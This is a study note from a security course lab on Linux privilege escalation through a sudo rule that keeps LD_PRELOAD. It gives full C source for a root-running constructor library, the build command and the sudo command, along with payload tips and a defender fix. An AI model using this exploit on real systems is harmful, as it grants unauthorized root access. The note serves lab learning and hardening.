#linux #privesc

`LD_PRELOAD` tells the dynamic linker to load a shared library of your choosing **before** a program starts — and that library's constructor runs **before `main()`**. If you can get `LD_PRELOAD` to survive into a process that runs as root, your code runs as root. The usual door is a sudo rule plus a leaky `Defaults` line.

## The hole: sudo `env_keep+=LD_PRELOAD`
`sudo -l` output to look for:
```
Defaults ... env_reset, ... , env_keep+=LD_PRELOAD
User analyst may run: (root) NOPASSWD: /usr/local/bin/<anything>
```
- `env_reset` normally **strips** your environment when sudo runs the command (the hardening).
- `env_keep+=LD_PRELOAD` **punches a hole** — it preserves your `LD_PRELOAD` into the root command's environment, undoing the protection.
- The allowed command can be totally harmless; you hijack it before it does anything.

(`LD_LIBRARY_PATH` in `env_keep` is exploitable the same way with a fake library.)

## Exploit
```bash
cat > /tmp/evil.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void init() {
    setgid(0);
    setuid(0);
    system("cp /root/flag.txt /tmp/flag.txt; chmod 644 /tmp/flag.txt");
    _exit(0);
}
EOF
gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c
sudo LD_PRELOAD=/tmp/evil.so /usr/local/bin/<allowed-cmd>
cat /tmp/flag.txt
```
- `__attribute__((constructor))` runs the function automatically at load time — cleaner than the old `void _init()` form (which needs `-nostartfiles`). Both are in the wild.
- `-fPIC -shared` builds a position-independent shared object (`.so`), which is what `LD_PRELOAD` loads.
- Set `LD_PRELOAD` **on the sudo line** (`sudo LD_PRELOAD=... cmd`), not exported beforehand.

> [!warning] Keep the payload NON-INTERACTIVE on fragile boxes
> Spawning an interactive root shell (`system("/bin/bash -p")`) from a constructor can get `Killed` on small/ephemeral containers (no clean TTY + tight memory → OOM/watchdog reaps it, sometimes taking the box down). Prefer "do the work and exit": copy the flag to a world-readable path, then `_exit(0)` from the constructor so the real program's `main()` never even runs. Same lesson applies to any payload (cron, PATH hijack, LD_PRELOAD) on a flaky box.

## Defender fix
Never `env_keep` the loader variables (`LD_PRELOAD`, `LD_LIBRARY_PATH`) — a single `+=` there undoes `env_reset` entirely.

---
## Case study — CYBR401 Lab 8 (c11 → root)
`sudo -l`: `Defaults ... env_keep+=LD_PRELOAD` and `(root) NOPASSWD: /usr/local/bin/analytics-report`. First attempt used `system("/bin/bash -p")` in the constructor → the box returned `Killed` (OOM/watchdog on the interactive shell). Switched to the non-interactive copy-and-`_exit(0)` payload above → flag in `/tmp`. One misconfiguration: `LD_PRELOAD` in `env_keep`.

**Takeaways logged:** `env_keep+=LD_PRELOAD` + any NOPASSWD command = root via a preloaded `.so` constructor. Build with `gcc -fPIC -shared`, use `__attribute__((constructor))`, set the var on the sudo line. On fragile boxes, do the work and `_exit(0)` — don't spawn a shell.

---
Related: [[11.4 SUID + GTFO Bins]] · [[06 Post Exploitation/Privilege Escalation|Privilege Escalation]] (LD_PRELOAD section) · [[11.1 Where to start]] (Phase 8 — Sudo Misconfiguration)
